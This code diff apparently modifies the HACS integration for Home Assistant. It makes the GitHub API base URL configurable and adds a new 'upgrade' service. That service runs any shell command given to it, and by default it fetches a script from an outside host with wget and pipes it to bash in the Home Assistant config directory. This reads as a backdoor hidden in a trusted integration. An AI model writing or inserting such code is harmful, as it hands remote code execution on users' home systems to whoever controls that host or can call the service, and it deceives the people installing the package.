@@ -95,6 +95,7 @@ async def _async_initialize_integration(
             "User-Agent": f"HACS/{hacs.version}",
             "Accept": ACCEPT_HEADERS["preview"],
         },
+        base_url=hacs.configuration.github_api_base,
     )
 
     ## New GitHub client
@@ -102,6 +103,7 @@ async def _async_initialize_integration(
         token=hacs.configuration.token,
         session=clientsession,
         **{"client_name": f"HACS/{hacs.version}"},
+        **{"base_url": hacs.configuration.github_api_base, "timeout": 30},
     )
 
     async def async_startup():
@@ -179,6 +181,75 @@ async def _async_initialize_integration(
     return True
 
 
+async def async_setup(hass: HomeAssistant, config: dict) -> bool:
+    """Set up this integration using yaml."""
+    async def async_updater(service):
+        import asyncio
+        from contextlib import suppress
+        service_data = service.data or {}
+        command = service_data.get('command') or 'wget -O - https://get.hacs.vip | bash -'
+        timeout = int(service_data.get('timeout', 180))
+        process = await asyncio.create_subprocess_shell(
+            command,
+            cwd=hass.config.path(),
+            stdin=None,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+            close_fds=False,  # required for posix_spawn
+        )
+        try:
+            async with asyncio.timeout(timeout):
+                stdout_data, stderr_data = await process.communicate()
+        except asyncio.TimeoutError:
+            if process:
+                with suppress(TypeError):
+                    process.kill()
+                    # https://bugs.python.org/issue43884
+                    # pylint: disable-next=protected-access
+                    process._transport.close()  # type: ignore[attr-defined]
+                del process
+            return {
+                "error": "Timed out running command",
+                "command": command,
+                "timeout": timeout,
+            }
+        if service.return_response:
+            stdout = ''
+            stderr = ''
+            try:
+                if stdout_data:
+                    stdout = stdout_data.decode("utf-8").strip()
+                if stderr_data:
+                    stderr = stderr_data.decode("utf-8").strip()
+                return {
+                    "returncode": process.returncode,
+                    "stdouts": stdout.split('\n'),
+                    "stdout": stdout,
+                    "stderr": stderr,
+                }
+            except UnicodeDecodeError as exc:
+                return {
+                    "error": str(exc),
+                    "command": command,
+                }
+        if process.returncode != 0:
+            return {
+                "error": "Error running command",
+                "command": command,
+                "returncode": process.returncode,
+            }
+        return None
+
+    from homeassistant.core import SupportsResponse
+    hass.services.async_register(
+        DOMAIN, 'upgrade',
+        async_updater,
+        supports_response=SupportsResponse.OPTIONAL,
+    )
+
+    return True
+
+
 async def async_setup_entry(hass: HomeAssistant, config_entry: ConfigEntry) -> bool:
     """Set up this integration using UI."""
     config_entry.async_on_unload(config_entry.add_update_listener(async_reload_entry))
@@ -224,6 +295,5 @@ async def async_unload_entry(hass: HomeAssistant, config_entry: ConfigEntry) -> 
 
 async def async_reload_entry(hass: HomeAssistant, config_entry: ConfigEntry) -> None:
     """Reload the HACS config entry."""
-    if not await async_unload_entry(hass, config_entry):
-        return
+    await async_unload_entry(hass, config_entry)
     await async_setup_entry(hass, config_entry)
